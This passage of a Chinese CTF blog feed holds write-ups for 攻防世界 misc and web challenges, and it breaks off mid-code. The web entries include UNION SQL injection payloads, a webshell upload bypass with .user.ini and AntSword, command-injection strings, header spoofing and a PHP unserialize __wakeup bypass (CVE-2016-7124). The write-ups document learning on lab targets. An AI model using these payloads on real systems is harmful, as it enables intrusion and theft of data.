以管道作为分界线，前面的命令有个输出，后面需要先输入（缺少查找范围），然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入。<br>为了便于理解，上述的指令变相实现可以如下：</p><p>ls &#x2F; &gt; xxx.txt 将ls &#x2F;的结果保存到xxx.txt文件中</p><p>grep “y” xxx.txt 使用grep指令搜索xxx.txt中的包含y的行</p><hr><h3 id="4-pure-color"><a href="#4-pure-color" class="headerlink" title="4.pure_color"></a>4.pure_color</h3><p>是一张图片，直接放到stegsolve中</p><p><img src="pure_color1.png" alt="pure_color1"></p><p>比较简单flag{true_steganographers_doesnt_need_any_tools}</p><p>不过这个题的flag挺有意思，他说真正的隐写技师不需要任何工具 [狗头]</p><hr><h3 id="5-2017-Dating-in-Singapore"><a href="#5-2017-Dating-in-Singapore" class="headerlink" title="5.2017_Dating_in_Singapore"></a>5.2017_Dating_in_Singapore</h3><p>题目名字叫新加坡2017年的日历，打开也是个日历，有点意思</p><p><img src="2017_Dating_in_Singapore1.png" alt="2017_Dating_in_Singapore1"></p><p><a href="https://blog.csdn.net/qq_42016346/article/details/104234416">wp</a></p><hr><h3 id="6-simple-transfer"><a href="#6-simple-transfer" class="headerlink" title="6.simple_transfer"></a>6.simple_transfer</h3><p>题目描述: 文件里有flag，找到它。</p><p>下载了一个pcap的流量包，网上的wp都过滤了很多nfs，然后找到了file.pdf，这也是后面为什么分离pdf的原因，但是我这就两条，<del>我不懂</del></p><p>直接扔到kali里输入命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> <span class="hljs-number">1</span>.pcap<br></code></pre></td></tr></table></figure><p>发现有一个pdf文件，接着输入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foremost -t pdf -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.pcap</span> <br></code></pre></td></tr></table></figure><p>-t为指定文件类型，-i是指定输入，-o是指定输出，这里没指出，默认给出output文件夹：</p><p><img src="simple_transfer1.png" alt="simple_transfer1"></p><p>然后打开文件夹：</p><p><img src="simple_transfer2.png" alt="simple_transfer2"></p><hr><h3 id="7-流量分析1"><a href="#7-流量分析1" class="headerlink" title="7.流量分析1"></a>7.流量分析1</h3><p>题目描述: </p><p>流量分析，你知道这堆流量做了什么事情吗，你能恢复出来flag吗？</p><p>文件名的challenge，很好，非常有挑战性：</p><p><img src="challenge1.png" alt="challenge1"></p><p>第四条流量一下就吸引住了我，追踪TCP流看一下：</p><p><img src="challenge2.png" alt="challenge2"></p><p>嗯？sql注入？</p><p>扔到burp里smart decode一下：</p><p><img src="challenge3.png" alt="challenge3"></p><p>bool盲注，这里直接过滤：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">addr</span>==192.168.43.109 &amp;&amp; ip.<span class="hljs-attribute">addr</span>==39.105.136.196 &amp;&amp;http.request.uri contains<span class="hljs-string">&quot;substr&quot;</span><br></code></pre></td></tr></table></figure><p>刚刚分析得到，如果if判断成功，那页面延迟三秒返回，这里我们应该关注一下时间，可以看到11秒到14秒刚好三秒，说明判断成功了，去看看</p><p><img src="challenge5.png" alt="challenge5"></p><p>ascii码是102，查表得知是’f’</p><p>看大佬wp得知，有一个过滤的命令可以过滤出延迟大于3秒的http数据包</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">frame.time_delta&gt;<span class="hljs-number">3</span><span class="hljs-meta">&amp;&amp;http</span><br></code></pre></td></tr></table></figure><p>那就方便多了，一个一个对照ascii码表就行了，这里最后一个字符是1，并不是}，不过前面已经有{了，这里我们手动加上就好了。</p><hr><h3 id="8-流量分析2"><a href="#8-流量分析2" class="headerlink" title="8.流量分析2"></a>8.流量分析2</h3><p>简单看了一下，好像没啥收获，去kali里试了一下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">binwalk <span class="hljs-keyword">test</span>.pcapng<br>strings <span class="hljs-keyword">test</span>.pcapng | grep<span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure><p>都没奏效，仔细看一下：<br><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.1.png" alt="流量分析2.1"></p><p>txt应该是有价值的东西，而且看样子不止一个，过滤一下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;test.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.2.png" alt="流量分析2.2"></p><p>果然有好几个test.txt，按时间顺序打开看看：<br><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.3.png" alt="流量分析2.3"></p><p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.4.png" alt="流量分析2.4"></p><p>两个里面都有内容，把他们串起来就是flag了：<strong>flag{17uaji1l}</strong> </p><p>这里要注意一下，包里并没有ag的内容，要自己加上</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>序列化</title>
    <link href="/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在我看完<a href="https://m.php.cn/article/358919.html">这篇文章</a>后，我终于懂了一些关于序列化的知识：</p><p>serialize() 函数会检查类中是否存在魔术方法比如 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>先看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;   <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;    <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$age</span>;    <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;&quot;</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;sex = <span class="hljs-variable">$sex</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br><br>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我的名字叫：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name . <span class="hljs-string">&quot; 性别：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;sex . <span class="hljs-string">&quot; 我的年龄是：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;age . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125;    <span class="hljs-comment">//指定串行化时把返回的数组中$name和$age值串行化，忽略没在数组中的属性$sex</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br><br>        <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br><br>    &#125;    <span class="hljs-comment">//重新生成对象时，并重新赋值$age为40</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-number">40</span>;<br><br>    &#125;<br><br>&#125;<span class="hljs-variable">$p1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<span class="hljs-comment">//把一个对象串行化，返一个字符串，调用了sleep()方法,忽略没在数组中的属性</span><br><br><span class="hljs-variable">$p1_string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p1_string</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">//串行化的字符串我们通常不去解析</span><br><br><span class="hljs-variable">$p2</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p1_string</span>); <span class="hljs-comment">//反串行化形成对象$p2重新赋值</span><br><br><span class="hljs-comment">//此时$age为40</span><br><br><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.sleep()函数会在序列化时被调用，比如我现在有一个Person类，有name，sex和age三个变量，并且类中有 __sleep()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br>       <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br> &#125;<br><span class="hljs-variable">$p1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br></code></pre></td></tr></table></figure><p>会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Person&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;张三&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">20</span>;&#125;<br></code></pre></td></tr></table></figure><p>他们分别表示：<br>变量类型:类名长度:类名:属性数量：{属性类型:属性名长度:属性名；属性值类型:属性值长度:属性值内容}</p><p>O（object）表示对象，因为$p1是类Person的一个对象</p><p>这里我们可以看到，创建类对象时，是有“男”这一属性的，但由于调用了 __sleep()，这一属性消失了，并且序列化后的属性数量由3变为了2，而当我最后使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<br></code></pre></td></tr></table></figure><p>由于$p2是反序列化后的$p1，而反序列化时又会调用wakeup函数，它修改了age的值</p><p>故返回值为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">我的名字叫：张三 性别： 我的年龄是：<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>可以看到，性别这一变量为空并且age为40</p><p>当私有成员序列化时: \x00 + [私有成员所在类名] + \x00 [变量名]</p><p>总结一下调用顺序</p><div align="center">serialize()   -------> sleep()</div><div align="center">unserialize()    -------> wakeup()</div>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>难度2</title>
    <link href="/2023/04/05/web02/"/>
    <url>/2023/04/05/web02/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-NewsCenter"><a href="#1-NewsCenter" class="headerlink" title="1.NewsCenter"></a>1.NewsCenter</h3><p>sql注入</p><p>查库名，就一个news</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">hello&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,schema_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>查表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">hello&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&quot;news&quot;</span> #<br></code></pre></td></tr></table></figure><p>得到news,secret_table</p><p>查secret_table</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">hello&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&quot;secret_table&quot;</span>#<br></code></pre></td></tr></table></figure><p>得到id,fl4g，查询fl4g：</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">hello&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,fl4g <span class="hljs-keyword">from</span> secret_table<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="newscenter.png" alt="newscenter"></p><hr><h3 id="2-upload1"><a href="#2-upload1" class="headerlink" title="2.upload1"></a>2.upload1</h3><p>直接上传shell.php</p><p><img src="upload11.png" alt="upload11"></p><p>果然没这么简单，上传现成的图片马4.jpg（难度1中用过）</p><p><img src="upload12.png" alt="upload12"></p><p>传了图片马之后，要想办法让它被解析，分布式配置文件依然被拦，想到难度1中用过.user.ini，再试一下</p><p>内容为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>当我想用burp改包的时候，我发现已经被拦了，再一细看，上传按钮不能点，我立刻想到难度1不能按的按钮，果不其然，直接删掉disabled&#x3D;””   </p><p>ps:写到这不得不说一句，难度顺序排的是真好，前面刚做过这里就用上了。</p><p><img src="upload13.png" alt="upload13"></p><p>依然是把内容类型改为image&#x2F;jpg，上传成功。</p><p><img src="upload14.png" alt="upload14"></p><p>但是名字被改了，.user.ini前面多了一串数字，显然失败了。<del>早该想到的</del></p><p><del>高端的食材往往采用最朴素的烹饪方式</del>，放大招：</p><p>直接上传4.jpg，burp改包，改成4.php，根据路径，蚁剑连接，getshell</p><p><img src="upload15.png" alt="upload15"></p><p>最后成功找到flag</p><p><img src="upload16.png" alt="upload16"></p><hr><h3 id="3-xff-referer"><a href="#3-xff-referer" class="headerlink" title="3.xff_referer"></a>3.xff_referer</h3><p>题目描述: X老师告诉小宁其实xff和referer是可以伪造的。</p><p>进入环境，页面有一句话：ip地址必须为123.123.123.123</p><h4 id="xff："><a href="#xff：" class="headerlink" title="xff："></a>xff：</h4><p>很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p><p>X-Forwarded-For的格式如下：</p><pre><code class="hljs">X-Forwarded-For: client1, proxy1, proxy2</code></pre><p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p><p>一般的客户端发送HTTP请求没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p><p>但是如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，获取的左边第一个IP地址将会是客户端伪造的IP。伪造X-Forwarded-For头只需加上X-Forwarded-For头就可以</p><h4 id="referer："><a href="#referer：" class="headerlink" title="referer："></a>referer：</h4><p>HTTP 请求的头信息里面，Referer 是一个常见字段，提供访问来源的信息。这个字段是可选的。客户端发送请求的时候，自主决定是否加上该字段。</p><p>以上摘自CSDN博主<a href="https://blog.csdn.net/weixin_45746283/article/details/127876705">「Arik0」的文章</a></p><p>了解到以上知识后，我们就知道该怎么做了，burp抓包，提交：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">123.123.123.123</span><br></code></pre></td></tr></table></figure><p>页面又提示必须来自<a href="https://www.google.com，该referer登场了：">https://www.google.com，该referer登场了：</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Referer：https:<span class="hljs-regexp">//</span>www.google.com<br></code></pre></td></tr></table></figure><p> <img src="xff_referer.png" alt="xff_referer"></p><p>注意，<strong>这里的xff和referer要在请求头中</strong></p><hr><h3 id="4-command-execution"><a href="#4-command-execution" class="headerlink" title="4.command_execution"></a>4.command_execution</h3><p>题目描述: 小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><p>先学习一下，Windows或Linux下命令执行漏洞要用到的</p><table><thead><tr><th align="left">分隔符</th><th align="left">用法</th><th>解释</th></tr></thead><tbody><tr><td align="left">;</td><td align="left">A;B</td><td>先执行A，在执行B</td></tr><tr><td align="left">&amp;</td><td align="left">A&amp;B</td><td>简单拼接，互不影响</td></tr><tr><td align="left">|</td><td align="left">A|B</td><td>显示B的执行结果</td></tr><tr><td align="left">&amp;&amp;</td><td align="left">A&amp;&amp;B</td><td>A执行成功才会执行B</td></tr><tr><td align="left">||</td><td align="left">A||B</td><td>A执行失败，然后才会执行B</td></tr></tbody></table><p>命令执行，想到命令行，dir行不通，就ls，可以得知是linux操作系统，这一点根据后门文件夹也能看出来</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls /<br></code></pre></td></tr></table></figure><p><img src="command_execution1.png" alt="command_execution1"></p><p>查找文件名中含有flag的文件</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;find / -name <span class="hljs-string">&quot;flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="command_execution2.png" alt="command_execution2"></p><p>找到flag.txt，打开，拿到flag。（Windows的查看文件内容命令是type）</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat /home/flag.txt<br></code></pre></td></tr></table></figure><hr><h3 id="5-web2"><a href="#5-web2" class="headerlink" title="5.web2"></a>5.web2</h3><p>又是学习php的一题，上菜：</p><p><img src="web21.png" alt="web21"></p><p>先时将flag字符串逆序，</p><p>然后每一个ascii码数值+1，</p><p>然后base64加密，</p><p>然后逆序，</p><p>然后再rot13加密</p><p>得到加密的密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p><p>写个php就行了，结果如图：</p><p><img src="web22.png" alt="web22"></p><p>ps：<strong>rot13加密和解密是同一个函数</strong></p><p>附<a href="https://c.runoob.com/compile/1/">php在线编码</a></p><hr><h3 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;     <span class="hljs-comment">//构造函数</span><br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;                  <span class="hljs-comment">//析构函数</span><br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;                   <span class="hljs-comment">//反序列化时将调用此函数</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);              <span class="hljs-comment">//base64解码</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>&#x2F;[oc]:\d+:&#x2F;i研究</strong>：</p><p>[OC]：匹配O或C</p><p>\d:  匹配一个数字字符。等价于 [0-9]。<br> +:  匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。<br>&#x2F;i:  表示匹配的时候不区分大小写。<br>preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头。</p><p>总的思路是，先base64编码一次，首先避开正则匹配，序列化后<strong>O:4</strong>刚好会被匹配，这里使用O:+4进行绕过。然后避开**_wakeup()<strong>函数，这里利用</strong>wakeup()的CVE-2016-7124**，当序列化字符串中的属性个数大于类中真实属性个数时，_wakeup()会跳过执行，以便读取fl4g.php。</p><p>这里还有一个点，类的私有成员序列化时会在类名和字段名上添加保护，格式为: \x00 + [私有成员所在类名] + \x00 [变量名]，前后均有空格</p><p>因此对于private属性在类名和字段名前均需要添加\0</p><p>当使用浏览器提交时需要在类名和字段名前添加%00  </p><p>本题是get传参，故加%00</p><p>php在线编译：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;  <span class="hljs-comment">//设置了类的私有变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <span class="hljs-comment">//实例化对象时将会被调用</span><br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//将对象的file属性的值设置为file变量</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//当对象被销毁时将会被调用</span><br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>);  <span class="hljs-comment">//输出读取到的文件</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-comment">//当进行反序列化操作时候  函数将会被调用</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php  //将对象的file参数设置为index.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<span class="hljs-comment">//实例化对象   __construct函数将会被自动调用  fl4g.php 将会被赋值给$file变量</span><br><br><span class="hljs-variable">$c</span>=<span 